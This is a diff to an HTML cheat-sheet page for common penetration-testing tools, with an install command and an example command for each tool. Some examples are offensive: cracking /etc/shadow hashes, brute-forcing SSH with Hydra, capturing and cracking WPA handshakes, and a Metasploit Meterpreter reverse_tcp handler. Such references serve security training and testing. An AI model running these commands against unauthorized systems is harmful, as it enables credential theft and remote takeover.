@@ -52,10 +52,10 @@
 
                 <div class="box" data-category="scan">
                     <h2>Nmap</h2>
-                    <h4>Nmap: SYN Scan with Service Version Detection & Default NSE Scripts</h4>
 
+                    <h4>Installation:</h4>
                     <div class="code-snippet">
-                        <code id="cmd-git">nmap -sS -sV -sC 10.0.0.0</code>
+                        <code>sudo apt update && sudo apt install nmap -y</code>
                         <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
                             <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
                                 fill="currentColor">
@@ -64,95 +64,177 @@
                             </svg>
                         </button>
                     </div>
-                    <p>Official website: <a href="https://nmap.org/" target="_blank"
-                            rel="noopener noreferrer">nmap.org</a></p>
+
+                    <h4>SYN scan plus version detection and default NSE scripts:</h4>
+                    <div class="code-snippet">
+                        <code>nmap -sS -sV -sC 10.0.0.0</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
+                            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
+                                fill="currentColor">
+                                <path
+                                    d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 18H8V7h11v16z" />
+                            </svg>
+                        </button>
+                    </div>
+
+                    <p>
+                        Official website:
+                        <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap.org</a>
+                    </p>
                 </div>
 
 
+
+                <!-- John the Ripper -->
                 <div class="box" data-category="post">
                     <h2>John the Ripper</h2>
-                    <h4>Run against `/etc/shadow` using the RockYou wordlist</h4>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install john -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Use rockyou wordlist to brute-force Linux <code>/etc/shadow</code> hashes</h4>
                     <div class="code-snippet">
                         <code>john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow</code>
-                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
-                            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
-                                fill="currentColor">
-                                <path
-                                    d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 18H8V7h11v16z" />
-                            </svg>
-                        </button>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
                     </div>
                     <p>
-                        View docs on the official site:
+                        Official website:
                         <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">
                             openwall.com/john
                         </a>
                     </p>
                 </div>
 
-                <div class="box" data-category="post">
-                    <h2>Test</h2>
-                    <h4>Run against `/etc/shadow` using the RockYou wordlist</h4>
+                <!-- Hydra -->
+                <div class="box" data-category="brute">
+                    <h2>Hydra</h2>
+                    <h4>Installation:</h4>
                     <div class="code-snippet">
-                        <code>john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow</code>
-                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
-                            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
-                                fill="currentColor">
-                                <path
-                                    d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 18H8V7h11v16z" />
-                            </svg>
-                        </button>
+                        <code>sudo apt update && sudo apt install hydra -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Attempt SSH logins using <code>users.txt</code> and <code>pass.txt</code></h4>
+                    <div class="code-snippet">
+                        <code>hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
                     </div>
                     <p>
-                        View docs on the official site:
-                        <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">
-                            openwall.com/john
+                        Official website:
+                        <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener noreferrer">
+                            github.com/vanhauser-thc/thc-hydra
+                        </a>
+                    </p>
+                </div>
+
+                <!-- Gobuster -->
+                <div class="box" data-category="web">
+                    <h2>Gobuster</h2>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install gobuster -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Discover hidden directories on a web server with a wordlist</h4>
+                    <div class="code-snippet">
+                        <code>gobuster dir -u https://target.com -w /usr/share/wordlists/raft-large-directories.txt -t 50</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <p>
+                        Official website:
+                        <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreferrer">
+                            github.com/OJ/gobuster
+                        </a>
+                    </p>
+                </div>
+
+                <!-- ffuf -->
+                <div class="box" data-category="web">
+                    <h2>ffuf</h2>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install ffuf -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Fuzz URL paths or parameters to find hidden endpoints</h4>
+                    <div class="code-snippet">
+                        <code>ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/raft-large-words.txt -t 100</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <p>
+                        Official website:
+                        <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">
+                            github.com/ffuf/ffuf
+                        </a>
+                    </p>
+                </div>
+
+                <!-- Airodump-ng -->
+                <div class="box" data-category="wireless">
+                    <h2>Airodump-ng</h2>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install aircrack-ng -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Monitor and save WPA/WPA2 handshake packets from a target BSSID</h4>
+                    <div class="code-snippet">
+                        <code>sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w dump wlan0mon</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <p>
+                        Official website:
+                        <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener noreferrer">
+                            aircrack-ng.org
+                        </a>
+                    </p>
+                </div>
+
+                <!-- Aircrack-ng -->
+                <div class="box" data-category="wireless">
+                    <h2>Aircrack-ng</h2>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install aircrack-ng -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Use rockyou wordlist to crack the captured <code>.cap</code> file</h4>
+                    <div class="code-snippet">
+                        <code>aircrack-ng -w /usr/share/wordlists/rockyou.txt dump-01.cap</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <p>
+                        Official website:
+                        <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener noreferrer">
+                            aircrack-ng.org
+                        </a>
+                    </p>
+                </div>
+
+                <!-- Metasploit -->
+                <div class="box" data-category="exploit">
+                    <h2>Metasploit</h2>
+                    <h4>Installation:</h4>
+                    <div class="code-snippet">
+                        <code>sudo apt update && sudo apt install metasploit-framework -y</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <h4>Launch a Meterpreter reverse_tcp handler on <code>LHOST:LPORT</code></h4>
+                    <div class="code-snippet">
+                        <code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"</code>
+                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">…</button>
+                    </div>
+                    <p>
+                        Official website:
+                        <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">
+                            metasploit.com
                         </a>
                     </p>
                 </div>
 
 
-                <div class="box" data-category="post">
-                    <h2>Test</h2>
-                    <h4>Run against `/etc/shadow` using the RockYou wordlist</h4>
-                    <div class="code-snippet">
-                        <code>john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow</code>
-                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
-                            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
-                                fill="currentColor">
-                                <path
-                                    d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 18H8V7h11v16z" />
-                            </svg>
-                        </button>
-                    </div>
-                    <p>
-                        View docs on the official site:
-                        <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">
-                            openwall.com/john
-                        </a>
-                    </p>
-                </div>
 
-                <div class="box" data-category="post">
-                    <h2>Test</h2>
-                    <h4>Run against `/etc/shadow` using the RockYou wordlist</h4>
-                    <div class="code-snippet">
-                        <code>john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow</code>
-                        <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
-                            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
-                                fill="currentColor">
-                                <path
-                                    d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 18H8V7h11v16z" />
-                            </svg>
-                        </button>
-                    </div>
-                    <p>
-                        View docs on the official site:
-                        <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">
-                            openwall.com/john
-                        </a>
-                    </p>
-                </div>
+
 
                 <!---------------------------------------------- content -------------------------------------------------------------->
             </section>
